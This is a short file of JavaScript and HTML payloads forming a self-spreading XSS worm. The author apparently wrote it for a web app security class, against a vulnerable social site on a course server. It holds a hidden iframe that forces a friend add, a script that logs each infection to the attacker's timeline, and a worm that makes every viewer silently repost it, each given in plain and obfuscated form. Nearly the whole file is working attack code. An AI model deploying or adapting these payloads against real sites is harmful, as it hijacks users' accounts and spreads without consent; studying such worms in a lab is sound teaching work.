//Author: Andrew Afonso
//Description: An XSS worm created for a vulnerable social website for my web app security class. 

//Triggers adding profile with id=119 as friend. This is posted on the malicious timeline. 
<iframe src='/add_friend.php?id=119' style='display:none'></iframe>

//Triggers a post on the attackers timeline that notes the time of infection. This is posted on the malicious timeline.
<script>
var wrm = new XMLHttpRequest();
wrm.open('GET', "http://csec380-core.csec.rit.edu:86/add_comment.php?id=119%26comment=".concat(escape("New friend (infection) on: ".concat(Date()))), true);
wrm.send();
</script>

//Obfuscated version of above. 
<script>var c2=["GET","concat","New friend (infection) on: ","http://csec380-core.csec.rit.edu:86/add_comment.php?id=119%26comment=","open","send"];var wrm= new XMLHttpRequest();var cat= "/home.php";wrm[c2[4]](c2[0],c2[3][c2[1]](escape(c2[2][c2[1]](Date()))),true);wrm[c2[5]]()</script>


//Worm itself. Spreads by causing those who load a page with this posted on it to repost it to their own timeline. 
<script>
var g = new XMLHttpRequest();
g.open('GET', "http://csec380-core.csec.rit.edu:86/add_comment.php?comment=".concat(escape("<iframe src='/timeline.php?id=119' style='display:none'></iframe>")), true);
g.send();
</script>

//Obfuscated version of above. 
<script>var ab=["GET","<iframe src=\'/timeline.php?id=119\' style=\'display:none\'></iframe>","concat","http://csec380-core.csec.rit.edu:86/add_comment.php?comment=","open","send"];var g= new XMLHttpRequest();var cat= "/home.php";g[ab[4]](ab[0],ab[3][ab[2]](escape(ab[1])),true);g[ab[5]]()</script>
